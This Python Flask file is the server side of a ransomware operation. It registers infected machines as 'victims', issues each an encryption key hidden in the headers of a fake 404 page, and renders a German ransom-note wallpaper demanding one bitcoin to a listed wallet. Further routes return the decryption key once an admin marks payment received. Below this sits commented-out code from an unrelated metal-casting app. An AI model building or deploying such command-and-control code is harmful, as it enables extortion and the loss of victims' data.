from flask import render_template, url_for, flash, redirect, request, make_response
from PIL import Image, ImageDraw, ImageFont
from app import app, db, auth, verify_password
from werkzeug.security import check_password_hash
from app.models import Victim, load_victim
import random, os
import base64

# Automatically creates a image file with the specified ransom note
# The image will be saved in a publicly available manner, so that an
# infected PC can pull it and set is as PC wallpaper
def create_custom_wallpaper(id, username, ip):
    img = Image.new("RGB", (1920, 1080))
    font = ImageFont.truetype("./app/static/agency.ttf", 37)
    text = f"Hallo {username},\n\nDein PC wurde nun von einer Ransomware befallen. Deine entsprechenden Daten wurden verschlüsselt und sind nicht mehr aufrufbar.\nUm wieder Zugriff zu erhalten müssen Sie 1 BTC (25000€) an folgendes Wallet überweisen : bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\nNach Eingang der Zahlung werden Ihre Daten wieder entschlüsselt.\n\nDeine IP zum Infektionszeitpunkt war die: {ip}\n\nVielen Dank.\nMit freundlichen Grüßen\n\nGerman Hacker"

    d = ImageDraw.Draw(img)
    d.text((10, 10), text, font=font, fill=(255, 0, 0))
    img.save(f"./app/static/wp/{id}.png")


# Show an overview of all victims currently registered in the database
@app.route("/", methods=["GET"])
@app.route("/overview", methods=["GET"])
@auth.login_required
def displayIndex():
    victims = Victim.query.filter_by(archived=0).all()
    return render_template(
        "overview.html",
        title="Übersicht Ransomware Opfer",
        victims=victims,
        user=auth.current_user(),
        count=len(victims),
    )


# Show archived victims in an overview table
@app.route("/archive")
@auth.login_required
def displayArchive():
    victims = Victim.query.filter_by(archived=1).order_by(Victim.victim_id.desc()).all()
    return render_template("archive.html", title="Archiv", victims=victims)


# When called, creates an Victim object in the DB and responds with a fake 404,
# with HTTP headers containing Encryption ID & Key
# ex: curl -i -X POST -F 'victim_hostname=RandomInfectedPC' -F 'victim_username=someUser' -F 'ip=192.168.178.3' http://127.1:5000/create
@app.route("/create", methods=["POST"])
def createVictim():
    error = None
    if request.method == "POST":
        # if request.accesskey == "accesskey":
        victim_id = random.randint(0, 999999999999)
        victim_key = base64.b64encode(os.urandom(32)).decode("ascii")
        victim = Victim(
            victim_id=victim_id,
            victim_username=request.form["username"],
            victim_hostname=request.form["hostname"],
            victim_key=victim_key,
            ip_firstContact=request.form["ip"],
        )
        db.session.add(victim)
        db.session.commit()
        create_custom_wallpaper(
            str(victim_id), request.form["username"], request.form["ip"]
        )
        response = make_response(render_template("404.html"), 404)
        response.headers["Victim-Id"] = str(victim_id)
        response.headers["Victim-Key"] = victim_key
        return response


# Checks if payment has been received by the specific victim ID.
# If so, return Decryption key to enable decryption on the client
# ex: curl -i -X POST http://127.1:5000/check/36821736128
@app.route("/check/<int:victim_id>", methods=["POST"])
def checkStatus(victim_id):
    victim = Victim.query.get(victim_id)
    response = make_response(render_template("404.html"), 404)
    response.headers["Payment-Received"] = str(victim.payment_received)
    if victim.payment_received:
        response.headers["Victim-Key"] = victim.victim_key
    return response


# When called, the specific victim has payed it's ransom and can be set as so in the DB
# ex: curl -i -X POST http://rnsm-admin:rnsm@localhost:5000/paymentReceived/261153847923
@app.route("/paymentReceived/<int:victim_id>", methods=["GET"])
@auth.login_required
def receivePayment(victim_id):
    victim = Victim.query.get(victim_id)
    victim.payment_received = True
    victim.archived = True
    db.session.commit()
    os.remove(f"./app/static/wp/{victim_id}.png")
    return redirect(url_for("displayIndex"))


# @app.route("/alloys")
# def displayAlloys():
#     alloys = Alloy.query.all()
#     return render_template("alloys.html", title="Legierungen", alloys=alloys)


# @app.route("/stats")
# def displayStats():
#     archivedCasts = Cast.query.filter_by(archived=1).all()
#     countEmbedding = {"phosphat": [0, 0], "speed": [0, 0], "gips": [0, 0]}
#     for cast in archivedCasts:
#         if cast.material_embedding == "phosphat" and cast.successful == 1:
#             countEmbedding["phosphat"][0] += 1
#         if cast.material_embedding == "phosphat" and cast.successful == 0:
#             countEmbedding["phosphat"][1] += 1
#         if cast.material_embedding == "speed" and cast.successful == 1:
#             countEmbedding["speed"][0] += 1
#         if cast.material_embedding == "speed" and cast.successful == 0:
#             countEmbedding["speed"][1] += 1
#         if cast.material_embedding == "gips" and cast.successful == 1:
#             countEmbedding["gips"][0] += 1
#         if cast.material_embedding == "gips" and cast.successful == 0:
#             countEmbedding["gips"][1] += 1
#     cuvetteCounts = {
#         1: [0, 0, 0, 0, 0, 0],
#         3: [0, 0, 0, 0, 0, 0],
#         6: [0, 0, 0, 0, 0, 0],
#         9: [0, 0, 0, 0, 0, 0],
#     }
#     for cuvetteSize in cuvetteCounts:
#         casts = Cast.query.filter_by(cuvette_size=cuvetteSize, archived=1).all()
#         for x in casts:
#             i = 0
#             while i < 6:
#                 if x.cuvette_nr == i:
#                     cuvetteCounts[cuvetteSize][i] += 1
#                 i += 1
#     crucibleCounts = [load_crucible(1).count, load_crucible(2).count]
#     return render_template(
#         "stats.html",
#         title="Statistiken",
#         counts=countEmbedding,
#         cuvetteCounts=cuvetteCounts,
#         crucibleCounts=crucibleCounts,
#     )


# @app.route("/api/archive/<int:cast_id>/<int:success>/")
# def archiveCast(cast_id, success):
#     if success == 1:
#         Cast.query.get(cast_id).archived = 1
#         Cast.query.get(cast_id).successful = 1
#         load_cast(cast_id).alloy.crucible.count += 1
#         db.session.commit()
#     elif success == 0:
#         Cast.query.get(cast_id).archived = 1
#         Cast.query.get(cast_id).successful = 0
#         load_cast(cast_id).alloy.crucible.count += 1
#         db.session.commit()
#     return redirect(url_for("displayIndex"))


# @app.route("/api/edit/<int:cast_id>/", methods=["GET", "POST"])
# def editCast(cast_id):
#     form = EditCastForm()
#     cast = Cast.query.get(cast_id)
#     if cast.archived == 1:
#         return redirect(url_for("displayIndex"))
#     if form.validate_on_submit():
#         density = Alloy.query.filter_by(alloy_id=form.alloyId.data).first().density
#         weightModel = float(form.weightModel.data.replace(",", "."))
#         if not form.weightAdditional.data:
#             weightAdditional = 8
#         else:
#             weightAdditional = float(form.weightAdditional.data.replace(",", "."))

#         if form.material.data == "resin":
#             weightMaterial = round((weightModel * density), 1)
#         else:
#             weightMaterial = round(((weightModel / 0.9) * density), 1)

#         cast.cast_name = form.castName.data
#         cast.cuvette_size = form.cuvetteSize.data
#         cast.cuvette_nr = form.cuvetteNr.data
#         cast.material = form.material.data
#         cast.material_embedding = form.materialEmbedding.data
#         cast.alloy_id = form.alloyId.data
#         cast.weight_model = weightModel
#         cast.weight_material = weightMaterial
#         cast.weight_total = weightMaterial + weightAdditional
#         db.session.commit()
#         flash("Guss " + str(cast.cast_id) + " erfolgreich bearbeitet!", "success")
#         return redirect(url_for("displayIndex"))
#     elif request.method == "GET":
#         form.castName.data = cast.cast_name
#         form.cuvetteSize.data = str(cast.cuvette_size)
#         form.cuvetteNr.data = str(cast.cuvette_nr)
#         form.material.data = cast.material
#         form.materialEmbedding.data = cast.material_embedding
#         form.alloyId.data = str(cast.alloy_id)
#         form.weightModel.data = cast.weight_model
#         form.weightAdditional.data = cast.weight_total - cast.weight_material
#     return render_template(
#         "edit.html", title="Bearbeiten", form=form, castnr=cast.cast_id
#     )


# @app.route("/api/delete/<int:delCast>/")
# def deleteCast(delCast):
#     if Cast.query.get(delCast).archived == 1:
#         Cast.query.filter_by(cast_id=delCast).delete()
#         db.session.commit()
#     return redirect(url_for("displayArchive"))


# @app.route("/api/reset/crucible/<int:crucibleID>/")
# def resetCrucible(crucibleID):
#     load_crucible(crucibleID).count = 0
#     db.session.commit()
#     return redirect(url_for("displayStats"))
